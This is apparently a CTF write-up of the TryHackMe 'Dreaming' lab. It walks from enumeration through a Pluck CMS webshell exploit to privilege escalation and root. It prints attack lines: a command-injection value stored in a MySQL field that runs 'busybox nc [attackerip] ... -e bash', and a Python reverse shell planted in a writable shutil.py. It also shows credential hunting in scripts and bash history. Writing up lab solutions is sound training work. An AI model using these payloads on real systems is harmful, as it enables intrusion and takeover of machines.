---
title: "Dreaming"
date: 2025-02-17
image: /assets/img/tryhackme/Dreaming/Dreaming_image.jpg
description: Writeup of the TryHackMe-CTF Dreaming
categories: [TryHackMe, Easy]
tags: [linux, python, web, exploit]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Dreaming</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Solve the riddle that dreams have woven.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/dreaming">https://tryhackme.com/room/dreaming</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Dreaming.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.145.239             
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 06:17 EST
  Nmap scan report for 10.10.145.239
  Host is up (0.042s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 39.65 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.145.239
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 06:18 EST
  Nmap scan report for 10.10.145.239
  Host is up (0.035s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
  |   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
  |_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The webserver provided an Apache2 default page. Nothing interesting in the source code, so I proceeded with a Gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.145.239 --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.145.239
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /app                  (Status: 301) [Size: 312] [--> http://10.10.145.239/app/]
```

![Directory listing](/assets/img/tryhackme/Dreaming/thm_dreaming_1.jpg)

The `/app` directory had directory browsing active and showed a folder called `pluck-4.7.13`. This folder provided another website. The URL was particularly interesting because of the `file` parameter, so I tried a path traversal attack which gave me the following error message:

![Path traversal attempt](/assets/img/tryhackme/Dreaming/thm_dreaming_2.jpg)

Another Gobuster scan inside the `pluck-4.7.13` directory, didn't reveal anything useful.
```bash
$ gobuster dir --url http://10.10.145.239/app/pluck-4.7.13/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.145.239/app/pluck-4.7.13/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 332] [--> http://10.10.145.239/app/pluck-4.7.13/images/]
  /docs                 (Status: 301) [Size: 330] [--> http://10.10.145.239/app/pluck-4.7.13/docs/]
  /files                (Status: 301) [Size: 331] [--> http://10.10.145.239/app/pluck-4.7.13/files/]
  /data                 (Status: 301) [Size: 330] [--> http://10.10.145.239/app/pluck-4.7.13/data/]
  /robots.txt           (Status: 200) [Size: 47]
```

I performed research on the version number of the content management system and found an entry in the <a href="https://www.exploit-db.com/exploits/49909">exploit-db</a>. The exploit needed the admin password. Since the instance did not appear personalized, I found the default credentials online. 

![pluck login](/assets/img/tryhackme/Dreaming/thm_dreaming_3.jpg)

With the found credentials, I could execute the exploit:
```bash
$ python3 exploit.py 10.10.145.239 80 [removed] /app/pluck-4.7.13/

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.145.239:80/app/pluck-4.7.13//files/shell.phar
```

The web shell worked perfectly, so I had an initial access:

![p0wny shell](/assets/img/tryhackme/Dreaming/thm_dreaming_4.jpg)

I used the web shell to switch to a `netcat` reverse shell and stabilized it. Since the challenge had a flag order, I proceeded by enumerating the user Lucien.

## Privilege Escalation lucien

To get an overview of the user's permissions, I started checking all files the user owns:
```bash
www-data@dreaming:/$ find / -user lucien -type f 2>/dev/null
  /opt/test.py
  [...]
```

The first one was quite interesting because it contained a password:
```python
www-data@dreaming:/opt$ cat test.py 
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[removed]"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```

With the password I was able to connect using SSH and retrieve the first flag:
```bash
lucien@dreaming:~$ cd /home/lucien/
lucien@dreaming:~$ cat lucien_flag.txt 
	THM{[removed]}
```

## Privilege Escalation death

Because I had success with the owner permissions, I did the same for the user `death`:
```bash
lucien@dreaming:~$ find / -user death -type f 2>/dev/null
  /opt/getDreams.py
  [...]
```

The file didn't help, so I proceeded with `sudo -l` and got the following output:
```bash
lucien@dreaming:/opt$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

lucien@dreaming:/home/death$ sudo -u death python3 /home/death/getDreams.py
  Alice + Flying in the sky

  Bob + Exploring ancient ruins

  Carol + Becoming a successful entrepreneur

  Dave + Becoming a professional musician
```

After analyzing the script I was confident that it could be used to escalate my permissions. But first I needed the local Mysql credentials. For finding them, I analyzed the website directory but didn't find anything there. After checking the `.bash_history` of the user lucien I found MySql credentials:

```bash
lucien@dreaming:~$ cat .bash_history 
[...]
mysql -u lucien -p[removed]
```

I was able to log in and add an entry in the table, where the `getDreams.py` reads from:
```sql
mysql> insert into dreams (dreamer, dream) values ("'test'", "&&busybox nc [attackerip] 9001 -e bash");
```

After executing the `getDreams.py` as user `death` the `netcat` listener received the connection. This worked because of the following line in the python script:
```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

The command in the shell was the following:
```bash
$ echo 'test' && busybox nc [attackerip] 9001 -e bash
```

With this misconfiguration I was able to, break out the command syntax and retrieve the next flag:
```bash
death@dreaming:~$ cat death_flag.txt 
THM{[removed]}
```

## Privilege Escalation morpheus

As user `death` I was able to read the original source code of `getDreams.py`, where I found the credentials of the user. This allowed me to connect with SSH, which is more comfortable then the reverse shell. The user Morpheus had an interesting Python script in his home directory:
```python
death@dreaming:/home/morpheus$ cat restore.py 
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

I checked the permissions of the imported libraries and found that the user death had the group permissions on the `shutil.py` which allowed me to modify it:
```bash
death@dreaming:/home/morpheus$ find / -type f -name shutil.py 2>/dev/null
  /usr/lib/python3.8/shutil.py
  /snap/core20/1974/usr/lib/python3.8/shutil.py
  /snap/core20/2015/usr/lib/python3.8/shutil.py
death@dreaming:/home/morpheus$ ls -al /usr/lib/python3.8/shutil.py
	-rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
```

I was able to modify the file and added a reverse shell:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("[attackerip]",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```

After executing the file, I received the reverse shell and was able to retrieve the last flag:
```bash
$ nc -lnvp 9002                      
listening on [any] 9002 ...
connect to [attackerip] from (UNKNOWN) [10.10.201.33] 36056
morpheus@dreaming:~$ cat morpheus_flag.txt
	THM{[removed]}
```

and finally, just for fun, I became root :)
```bash
morpheus@dreaming:~$ sudo -l
  Matching Defaults entries for morpheus on dreaming:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User morpheus may run the following commands on dreaming:
      (ALL) NOPASSWD: ALL
morpheus@dreaming:~$ sudo su
root@dreaming:/home/morpheus# cd /root
root@dreaming:~# ls
  snap
root@dreaming:~# id
  uid=0(root) gid=0(root) groups=0(root)
```

solved! :)